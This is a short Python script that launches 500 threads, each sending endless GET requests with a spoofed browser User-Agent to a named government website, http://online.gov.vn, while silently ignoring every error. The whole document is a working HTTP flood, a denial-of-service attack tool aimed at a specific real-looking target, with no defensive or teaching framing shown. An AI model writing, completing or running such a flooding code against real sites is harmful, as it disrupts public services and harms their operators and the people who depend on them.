import requests
import threading

def flood():
    url = "http://online.gov.vn"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    while True:
        try:
            requests.get(url, headers=headers, timeout=1)
        except:
            pass

threads = 500
for _ in range(threads):
    threading.Thread(target=flood).start()
